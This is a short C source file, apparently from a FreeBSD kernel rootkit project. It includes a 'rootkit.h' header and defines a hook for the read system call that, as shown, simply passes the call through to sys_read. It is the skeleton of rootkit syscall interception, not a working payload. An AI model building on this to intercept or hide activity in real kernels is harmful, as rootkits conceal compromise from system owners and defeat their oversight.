#include "rootkit.h"

// struct read_args {
// 	int	fd;
// 	void	*buf;
// 	size_t	nbyte;
// };

int hook_sys_read(struct thread * td, struct read_args * uap) {
	return sys_read(td, uap);
}
